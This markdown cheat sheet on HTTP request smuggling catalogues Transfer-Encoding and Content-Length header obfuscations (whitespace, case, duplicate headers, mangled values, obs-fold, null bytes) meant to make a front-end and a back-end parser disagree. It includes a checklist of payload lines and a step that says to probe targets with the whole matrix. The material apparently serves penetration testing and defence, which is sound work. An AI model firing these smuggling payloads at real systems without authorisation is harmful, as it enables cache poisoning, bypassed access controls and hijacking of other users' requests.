# TE/CL obfuscation — making one parser see what the other doesn't

## The principle — the obfuscated header is honored by ONE parser only

`Transfer-Encoding: chunked` is RFC-strict, but parsers differ on what
counts as "chunked" — the obfuscation makes ONE parser see `chunked` and
the other see garbage it falls back to CL on. TE.TE desync lives here.

## The whitespace tricks — `Transfer-Encoding : chunked`

```text
Transfer-Encoding : chunked     — space before colon
Transfer-Encoding:  chunked     — extra spaces
Transfer-Encoding:\tchunked     — tab before value
Transfer-Encoding: chunked\t    — tab after
```

Some parsers reject the space-before-colon (illegal token), others trim
it — the disagreement is the desync.

## The case tricks — `Transfer-Encoding: Chunked` / `CHUNKED`

```text
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: ChUnKeD
```

TE values are case-insensitive per RFC but some parsers do exact-match —
`Chunked` vs `chunked` lands differently.

## The duplicate-TE tricks — the second header wins

```text
Transfer-Encoding: chunked
Transfer-Encoding: cow          — first parser sees chunked, second sees cow
```

Two TE headers — one parser takes the first, another takes the last, a
third joins them — `chunked,cow` is invalid → fallback to CL.

## The value-mangle tricks — `xchunked`, `chunkedx`, `chunked;`

```text
Transfer-Encoding: xchunked
Transfer-Encoding: chunkedx
Transfer-Encoding: chunked;
Transfer-Encoding: chunked ;
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked,chunked
```

Each mangle breaks exact-match parsers — the parser falls back to CL —
while a tolerant parser strips and honors `chunked`.

## The wrapped-line trick — `Transfer-Encoding:\r\n chunked`

```text
Transfer-Encoding:
 chunked
```

The continuation-line (obs-fold) — the value is on the NEXT line with a
leading space — an RFC-strict parser rejects obs-fold, a lenient parser
joins — disagreement.

## The duplicate-CL tricks — `CL: 4` / `CL: 7`

```text
Content-Length: 4
Content-Length: 7
```

Two CL headers — RFC says reject — some stacks pick first, some pick
last, some merge → a CL.CL desync.

## The CL-plus-TE mixing — `CL: N` + `TE: chunked` in various orders

```text
Content-Length: 4
Transfer-Encoding: chunked      — RFC: TE wins; some parsers honor CL
```

vs

```text
Transfer-Encoding: chunked
Content-Length: 4
```

The ORDER matters to some parsers — first-header-wins vs last-header-wins.

## The non-header TE — `Transfer_Encoding`, `TE:`, `Transfer:`

```text
Transfer_Encoding: chunked      — underscore variant
TE: chunked                     — short-form (some proxies honor)
Transfer: chunked               — truncated name
```

Some parsers match on prefix or on a non-standard token — a header the
front misses but the back sees.

## The null-byte / control-char tricks

```text
Transfer-Encoding: chu\x00nked   — null inside value
Transfer-Encoding:\x0bchunked    — vertical tab
```

A parser that stops at `\x00` sees `chu` (invalid) → falls back; a parser
that skips control chars sees `chunked`.

## The space-mutations checklist — the common obfuscations

```text
Transfer-Encoding: chunked          — baseline
Transfer-Encoding : chunked         — space before colon
Transfer-Encoding:  chunked         — extra space
Transfer-Encoding:\tchunked         — tab
Transfer-Encoding: chunked\t        — trailing tab
Transfer-Encoding: chunked ;        — trailing space+semicolon
Transfer-Encoding: chunked,
Transfer-Encoding: ,chunked
Transfer-Encoding: chunked chunked  — double value
Transfer-Encoding: chunked cow      — second invalid
Transfer-Encoding: xchunked         — prefix mangle
Transfer-Encoding: chunkedx         — suffix mangle
Transfer-Encoding: chunked;         — trailing semi
Transfer-Encoding: "chunked"        — quoted
Transfer-Encoding: chunked,chunked  — repeat
Transfer-Encoding: cow\r\n chunked  — obs-fold
```

## The probe — fire the obfuscation matrix

For each obfuscation, send the TE.CL probe — the obfuscation that makes
the front see `chunked` but the back see `CL` (or vice versa) is the
live desync — `detection.md` — the timeout/404 oracles.

## The `chunked`+`identity` — the lenient-fallback

```text
Transfer-Encoding: chunked, identity
```

`chunked` AND `identity` — a parser honoring `identity` ignores chunking
→ falls back to CL; a parser honoring `chunked` chunks — disagreement.
